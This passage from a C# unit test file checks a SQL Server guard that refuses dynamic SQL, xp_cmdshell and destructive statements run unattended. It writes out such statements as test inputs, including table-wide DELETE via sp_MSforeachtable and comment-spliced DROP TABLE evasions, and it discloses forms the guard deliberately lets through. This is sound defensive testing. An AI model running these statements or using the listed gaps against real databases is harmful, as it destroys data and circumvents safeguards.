            Assert.False(DangerousExecGuard.Inspect("DECLARE @s NVARCHAR(200)='x'; EXECUTE (@s);", ExecSurfacePolicy.Unattended).IsAllowed);
            Assert.False(DangerousExecGuard.Inspect("DECLARE @s NVARCHAR(200)='x'; EXEC @s;", ExecSurfacePolicy.Unattended).IsAllowed);

            // Probe b05 (fix round 2): sp_MSforeachtable / sp_MSforeachdb take a command STRING and run
            // it against every table or database. The payload lives in a string argument, so literal
            // blanking empties it and none of the three patterns above could ever see it — this single
            // statement ran arbitrary DML against every table until the proc NAME was added to the class.
            var forEachTable = DangerousExecGuard.Inspect("EXEC sp_MSforeachtable 'DELETE FROM ?';", ExecSurfacePolicy.Unattended);
            Assert.False(forEachTable.IsAllowed);
            Assert.Contains("sp_MSforeachtable", forEachTable.Reason);
            Assert.False(DangerousExecGuard.Inspect("EXEC sp_MSforeachdb 'DBCC SHRINKDATABASE(''?'')';", ExecSurfacePolicy.Unattended).IsAllowed);
            Assert.False(DangerousExecGuard.Inspect("EXEC master.sys.sp_MSforeachtable @command1 = 'TRUNCATE TABLE ?';", ExecSurfacePolicy.Unattended).IsAllowed);
            // It belongs to the DYNAMIC class, not the destructive one — selectable independently.
            Assert.False(DangerousExecGuard.Inspect("EXEC sp_MSforeachtable 'DELETE FROM ?';", ExecSurfacePolicy.DynamicExec).IsAllowed);

            // Probe m08 (fix round 2), a FALSE POSITIVE that this class used to produce: capturing a
            // stored procedure's RETURN CODE is ordinary T-SQL, not run-time-built SQL. The old pattern
            // `EXEC(?:UTE)?\s+@\w+` could not tell `EXEC @rc = proc` from `EXEC @sql`, so a customer's
            // existing nightly task in this shape would have started failing at the next tick, with a
            // reason that misdescribed it.
            Assert.True(DangerousExecGuard.Inspect(
                "DECLARE @rc INT; EXEC @rc = dbo.usp_Nightly; SELECT @rc;", ExecSurfacePolicy.Unattended).IsAllowed);
            Assert.True(DangerousExecGuard.Inspect(
                "DECLARE @rc INT; EXECUTE @rc = msdb.dbo.sp_start_job @job_name = 'Nightly';", ExecSurfacePolicy.Unattended).IsAllowed);
            Assert.True(DangerousExecGuard.Inspect(
                "DECLARE @rc INT; EXEC @rc=dbo.usp_Nightly;", ExecSurfacePolicy.Unattended).IsAllowed);
            // …but the executed MODULE being a variable is still dynamic, return code or not.
            Assert.False(DangerousExecGuard.Inspect(
                "DECLARE @rc INT, @sql NVARCHAR(200)='x'; EXEC @rc = @sql;", ExecSurfacePolicy.Unattended).IsAllowed);

            // Calling a NAMED procedure is not dynamic SQL and is untouched.
            Assert.True(DangerousExecGuard.Inspect("EXEC dbo.usp_Nightly @Full = 1;", ExecSurfacePolicy.Unattended).IsAllowed);
            Assert.True(DangerousExecGuard.Inspect("EXECUTE AS LOGIN = 'svc'; REVERT;", ExecSurfacePolicy.Unattended).IsAllowed);

            // And dynamic SQL is NOT refused on the attended surfaces — the shipped dashboard panels
            // build per-database SQL exactly this way (Config/dashboard-config.json).
            Assert.True(DangerousExecGuard.Inspect("EXEC sp_executesql @sql;").IsAllowed);
            Assert.True(DangerousExecGuard.Inspect("EXEC(@sql);").IsAllowed);
        }

        [Fact]
        public void CommentSplicingBetweenKeywords_DoesNotEvadeTheClass()
        {
            // MEASURED LIVE on .\new2022 (MSI\NEW2022, SQL 2022 16.0.4262.2) 2026-09-07 03:39, so the
            // two forms are not guessed at:
            //   `DR/**/OP TABLE dbo.x;`        -> Msg 156, incorrect syntax near 'TABLE'.  NOT VALID SQL.
            //   `EXEC master..xp_/**/cmdshell` -> Msg 102, incorrect syntax near 'dir'.     NOT VALID SQL.
            //   `DROP/**/TABLE dbo.zz_eg_splice;` -> exit 0. The table really was dropped.
            // So splicing a comment INSIDE a keyword is not an evasion — the server refuses it too.
            // Splicing one BETWEEN keywords is real, valid T-SQL, and it is the form that must be
            // caught. The splitter replaces a comment with a space before any pattern runs, so it
            // normalises to `DROP TABLE`. This test is the pin on that behaviour.
            Assert.False(DangerousExecGuard.Inspect("DROP/**/TABLE dbo.Invoices;", ExecSurfacePolicy.Unattended).IsAllowed);
            Assert.False(DangerousExecGuard.Inspect("TRUNCATE/**/TABLE dbo.Invoices;", ExecSurfacePolicy.Unattended).IsAllowed);
            Assert.False(DangerousExecGuard.Inspect("ALTER/**/DATABASE [P] SET RECOVERY SIMPLE;", ExecSurfacePolicy.Unattended).IsAllowed);
            Assert.False(DangerousExecGuard.Inspect("DROP/*x*/TABLE dbo.Invoices;", ExecSurfacePolicy.Unattended).IsAllowed);

            // The same normalisation protects the ORIGINAL class, on every surface.
            Assert.False(DangerousExecGuard.Inspect("EXEC/**/xp_cmdshell 'dir';").IsAllowed);

            // …and the temp-table exemption survives the normalisation rather than being widened by it.
            Assert.True(DangerousExecGuard.Inspect("DROP/**/TABLE #staging;", ExecSurfacePolicy.Unattended).IsAllowed);
        }

        // ── Contract 6: THE DISCLOSED LIMITS ────────────────────────────────────────────────────
        // Everything below is ALLOWED on the unattended surface ON PURPOSE. Each case is pinned so
        // that the disclosure is structural: if someone later widens the class and forgets to update
        // the release note and the class doc, this test fails and makes them do it. The house rule
        // this serves is that no prose may outrun its evidence — in either direction.
        [Fact]
        public void TheLimitsOfTheDestructiveClass_AreDisclosedAndPinned()
        {
            // (1) The no-WHERE rule is a CLAUSE test, not a predicate evaluation. Deciding whether a
            // predicate restricts any row means evaluating SQL. Both of these empty the table and both
            // are allowed; the release note and the reason string both say so in as many words.
            Assert.True(DangerousExecGuard.Inspect(
                "DELETE FROM dbo.Orders WHERE 1=1;", ExecSurfacePolicy.Unattended).IsAllowed);              // b03
            Assert.True(DangerousExecGuard.Inspect(
                "DELETE FROM dbo.Orders WHERE Id IN (SELECT Id FROM dbo.Orders WHERE 1=1);",
                ExecSurfacePolicy.Unattended).IsAllowed);                                                   // b32

            // And the reason a blocked DELETE gives says exactly that, so the operator is not told
            // something the guard cannot deliver.
            var noWhere = DangerousExecGuard.Inspect("DELETE FROM dbo.Orders;", ExecSurfacePolicy.Unattended);
            Assert.False(noWhere.IsAllowed);
            Assert.Contains("no WHERE clause", noWhere.Reason);
            Assert.Contains("not evaluated", noWhere.Reason);

            // (2) A MERGE whose only DELETE action is WHEN MATCHED is row-targeted by the join, on the
            // same rule as a DELETE that carries a WHERE. NOT MATCHED BY SOURCE is the whole-table form
            // and IS blocked (pinned in DestructiveClass_IsBlocked_UnderTheUnattendedPolicy).
            Assert.True(DangerousExecGuard.Inspect(
                "MERGE dbo.Orders AS t USING dbo.Staging s ON t.Id = s.Id WHEN MATCHED THEN DELETE;",
                ExecSurfacePolicy.Unattended).IsAllowed);

            // (3) A backup to a LOCAL path is ordinary maintenance and stays allowed. Only egress OFF
            // the machine is refused. This is also the correction to the scoping citation: the shipped
            // BackupCheckDbOpRenderer emits this shape, so a global switch would NOT have refused it.
            Assert.True(DangerousExecGuard.Inspect(
                "BACKUP DATABASE [MyDb] TO DISK = 'D:\\bak\\MyDb.bak';", ExecSurfacePolicy.Unattended).IsAllowed);

            // (4) DBCC SHRINKDATABASE / SHRINKFILE and DBCC FREEPROCCACHE stay allowed. They hurt
            // performance; they do not destroy data or change a permission, and customers schedule them.
            Assert.True(DangerousExecGuard.Inspect("DBCC SHRINKDATABASE(0);", ExecSurfacePolicy.Unattended).IsAllowed);   // b21
            Assert.True(DangerousExecGuard.Inspect("DBCC FREEPROCCACHE;", ExecSurfacePolicy.Unattended).IsAllowed);

            // (5) An unqualified UPDATE is deliberately outside the class: an UPDATE that touches every
            // row is a data change, not a data loss, and a blanket refusal would stop ordinary
            // set-everything-to-a-default maintenance.
            Assert.True(DangerousExecGuard.Inspect("UPDATE dbo.T SET col = 1;", ExecSurfacePolicy.Unattended).IsAllowed);

            // (6) ENABLE TRIGGER is not blocked. Restoring a control is not a destructive act.
            Assert.True(DangerousExecGuard.Inspect("ENABLE TRIGGER ALL ON DATABASE;", ExecSurfacePolicy.Unattended).IsAllowed);

            // (7) The read-only members of the RESTORE family are what the product's own restore
            // verification uses, and they are not matched by the RESTORE DATABASE/LOG rule.
            Assert.True(DangerousExecGuard.Inspect(
                "RESTORE VERIFYONLY FROM DISK = 'D:\\bak\\p.bak';", ExecSurfacePolicy.Unattended).IsAllowed);
            Assert.True(DangerousExecGuard.Inspect(
                "RESTORE HEADERONLY FROM DISK = 'D:\\bak\\p.bak';", ExecSurfacePolicy.Unattended).IsAllowed);
        }

        [Fact]
        public void ReservedWordsInsideOtherStatements_DoNotTripTheUnattendedPolicy()
        {
            // Dropping the '^' anchor means DELETE and GRANT are now matched wherever they appear, so
            // the places those reserved words legitimately sit INSIDE another statement have to be
            // ruled out by shape. Each of these is a real maintenance/DDL statement.
            Assert.True(DangerousExecGuard.Inspect(
                "ALTER TABLE dbo.Child ADD CONSTRAINT FK_C FOREIGN KEY (ParentId) REFERENCES dbo.Parent(Id) ON DELETE CASCADE;",
                ExecSurfacePolicy.Unattended).IsAllowed);
            Assert.True(DangerousExecGuard.Inspect(
                "CREATE TRIGGER dbo.tr_T ON dbo.T AFTER INSERT, UPDATE, DELETE AS SET NOCOUNT ON;",
                ExecSurfacePolicy.Unattended).IsAllowed);
            Assert.True(DangerousExecGuard.Inspect(
                "CREATE TRIGGER dbo.tr_V ON dbo.V INSTEAD OF DELETE AS SET NOCOUNT ON;",
                ExecSurfacePolicy.Unattended).IsAllowed);
            Assert.True(DangerousExecGuard.Inspect(
                "MERGE dbo.T AS t USING dbo.S s ON t.Id = s.Id WHEN MATCHED THEN DELETE;",
                ExecSurfacePolicy.Unattended).IsAllowed);
        }

        [Fact]
        public void TheTwoAddedClasses_AreIndependentlySelectable()
        {
            // Destructive without dynamic…
            Assert.False(DangerousExecGuard.Inspect("DROP TABLE dbo.T;", ExecSurfacePolicy.Destructive).IsAllowed);
            Assert.True(DangerousExecGuard.Inspect("EXEC sp_executesql @sql;", ExecSurfacePolicy.Destructive).IsAllowed);

            // …and dynamic without destructive.
            Assert.True(DangerousExecGuard.Inspect("DROP TABLE dbo.T;", ExecSurfacePolicy.DynamicExec).IsAllowed);
            Assert.False(DangerousExecGuard.Inspect("EXEC sp_executesql @sql;", ExecSurfacePolicy.DynamicExec).IsAllowed);

            Assert.Equal(ExecSurfacePolicy.Destructive | ExecSurfacePolicy.DynamicExec, ExecSurfacePolicy.Unattended);
        }
    }
}
